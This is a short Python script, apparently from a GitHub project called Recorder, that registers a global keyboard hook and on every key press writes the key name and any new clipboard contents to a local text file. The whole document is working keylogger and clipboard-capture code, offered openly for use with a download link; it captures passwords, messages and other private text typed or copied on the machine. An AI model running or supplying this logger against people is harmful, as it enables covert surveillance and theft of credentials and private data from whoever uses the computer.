import pyperclip
import keyboard

clipboard_content = ''
recorded_content = set()  # 用集合存储已经记录的内容

with open('clipboard_record.txt', 'a') as f:
    f.write('--- Start recording ---\n')

def on_key_press(event):
    global clipboard_content
    global recorded_content
    current_content = pyperclip.paste()
    if current_content != clipboard_content and current_content not in recorded_content:
        recorded_content.add(current_content)
        clipboard_content = current_content
        with open('clipboard_record.txt', 'a') as f:
            f.write(f'{clipboard_content}\n')
            f.flush()
            print(f'Recorded content: {clipboard_content}')
    with open('clipboard_record.txt', 'a') as f:
        f.write(f'{event.name}\n')
        f.flush()
        print(f'Recorded key press: {event.name}')

keyboard.on_press(on_key_press)

keyboard.wait()  # 等待键盘输入

# Download：https://github.com/rockppt/Recorder.git